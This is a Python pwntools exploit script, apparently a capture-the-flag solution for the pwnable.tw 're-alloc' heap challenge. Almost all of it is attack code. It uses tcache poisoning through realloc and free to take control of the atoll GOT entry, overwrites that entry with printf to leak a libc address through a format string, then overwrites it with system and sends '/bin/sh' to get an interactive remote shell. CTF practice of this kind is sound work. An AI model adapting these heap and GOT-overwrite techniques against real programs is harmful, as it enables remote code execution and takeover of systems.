#!/usr/bin/env python
from pwn import *

DEBUG = 1
# context.log_level = 'DEBUG'

if DEBUG:
	elf = ELF('./re-alloc')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	io = process('./re-alloc')

else:
	io = remote('chall.pwnable.tw', 10106)
	elf = ELF('./re-alloc')
	libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")

def alloc(index, size, content=''):
	io.sendlineafter('choice: ', '1')
	io.sendlineafter('Index:',	str(index))
	io.sendlineafter('Size:',	str(size))
	if size != 0:
		io.sendlineafter('Data:', content)

def realloc(index, size, content=''):
	io.sendlineafter('choice: ',	'2')
	io.sendlineafter('Index:',	str(index))
	io.sendlineafter('Size:',	str(size))
	if size != 0:
		io.sendlineafter('Data:', content)

def free(index):
	io.sendlineafter('choice: ', '3')
	io.sendlineafter('Index:', str(index))

# # test 
# alloc(0, 20)
# alloc(1, 20)
# gdb.attach(io,'''
# 	b*0x40172a
# 	c
# 	''')
# # free idx 0, 1
# realloc(0, 0)
# realloc(1, 0)


# arbitrary write
## pollute 0x20 bins with atoll address

alloc(1, 20, b'aaaa')
realloc(1, 0)
realloc(1, 20, p64(elf.got.atoll))
alloc(0, 20, b'cccc')

## set null to heap global
realloc(1,80,'aaaa')
free(1)
realloc(0,100,'bbbb')
free(0)

## pollute 0x30 bins with atoll address

alloc(1, 30, b'aaaa')
realloc(1, 0)
realloc(1, 30, p64(elf.got.atoll))
alloc(0, 30, b'cccc')

## set null to heap global
realloc(1,80,'aaaa')
free(1)
realloc(0,100,'bbbb')
free(0)

# patch atoll

# gdb.attach(io,'''
# 	b*0x40172a
# 	c
# 	''')
alloc(0, 30, p64(elf.plt.printf))

# leaking libc

io.sendlineafter('choice: ', '3')
io.sendlineafter('Index:', '%21$p')
if DEBUG:
	libc.address = (int(io.recvline().strip(),16) -231) - libc.sym.__libc_start_main
	log.success("libc: " + hex(libc.address))
else:
	libc.address = (int(io.recvline().strip(),16) -235) - libc.sym.__libc_start_main 	
	log.success("libc: " + hex(libc.address))


# RCE
alloc('','A'*10, p64(libc.sym.system))
io.sendlineafter('choice: ', '3')
io.sendlineafter('Index:', '/bin/sh')


io.interactive()